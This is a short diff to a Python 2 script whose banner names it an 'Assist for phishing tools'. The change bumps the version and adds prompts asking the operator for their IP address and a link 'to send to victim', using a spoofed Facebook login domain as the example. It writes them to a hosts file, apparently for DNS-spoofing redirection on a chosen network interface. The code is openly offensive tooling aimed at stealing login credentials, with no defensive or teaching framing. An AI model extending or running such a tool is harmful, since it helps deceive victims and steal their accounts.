@@ -11,7 +11,7 @@ def logo():
   print '======================================================='
   print '=        Assist for phishing tools                    ='
   print '+++++++++++++++++++++++++++++++++++++++++++++++++++++++'
-  print '=                     V.1.0                           ='
+  print '=                     V.1.2                           ='
   print '+++++++++++++++++++++++++++++++++++++++++++++++++++++++'
   print '=  contact me on telegram https://t.me/nahom_0ghost   ='
   print '======================================================='
@@ -31,6 +31,14 @@ else:
     print 'thanks for using the tool'
     exit()
 logo()
+print 'Enter your ipaddres to redirected to'
+print 'Next enter the link that you want to send to victim'
+print 'Dont forget to make space beetwen yourip and link EX:-192.168.200.130   sevice.login.facebook' 
+
+file = open("hosts.txt", "w")
+option3 = raw_input("==>")
+file.write(option3)
+file.close()
 
 print '[1] for selecting eth0 as interface'
 print '[2] for selecting wlan0 as interface'
